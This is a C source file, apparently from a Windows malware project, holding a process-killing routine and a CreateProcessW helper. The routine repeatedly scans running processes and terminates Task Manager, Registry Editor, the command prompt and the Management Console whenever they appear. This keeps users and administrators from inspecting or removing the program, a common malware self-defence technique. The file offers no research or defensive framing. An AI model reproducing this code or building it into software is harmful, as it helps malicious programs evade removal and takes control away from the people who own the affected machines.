#include "pch.h"
#include "_rift.h"

static PCWSTR t_szProcs[] = {
	L"taskmgr.exe",
	L"regedit.exe",
	L"cmd.exe",
	L"mmc.exe"
};

// not sure about this
// might reconsider doing something else
BOOL fnProcessMonitorW() {
	HANDLE hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (hProcSnap) {
		PROCESSENTRY32W pe32;
		pe32.dwSize = sizeof(pe32);

		if (Process32FirstW(hProcSnap, &pe32))
			do {
				for (UINT8 i = 0; i < sizeof(t_szProcs) / sizeof(*t_szProcs); i++)
					if (!lstrcmpW(pe32.szExeFile, t_szProcs[i])) {
						HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
						if (hProc) {
							TerminateProcess(hProc, fnNext128ss());
							CloseHandle(hProc);
						}
					}
			} while (Process32NextW(hProcSnap, &pe32));

		CloseHandle(hProcSnap);
	}

	return FALSE;
}

BOOL fnCreateProcessExW(
	_In_     PCWSTR pFileName,
	_In_opt_ PCWSTR pCmdLine,
	_In_opt_ DWORD  dwCreationFlags,
	_In_opt_ PCWSTR pDirectory
) {
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	PWSTR pCmdLineC;
	if (pCmdLine) {
		SIZE_T nCmdLine;
		StringCchLengthW(pCmdLine, PATHCCH_MAX_CCH, &nCmdLine);
		pCmdLineC = (PWSTR)AllocMemory((nCmdLine + 1) * sizeof(WCHAR), 0);
		CopyMemory(pCmdLineC, pCmdLine, (nCmdLine + 1) * sizeof(WCHAR));
	} else
		pCmdLineC = NULL;

	BOOL bs = CreateProcessW(pFileName, pCmdLineC, 0, 0, FALSE, dwCreationFlags, 0, pDirectory, &si, &pi);
	if (bs) {
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}

	FreeMemory(pCmdLineC);
	return bs;
}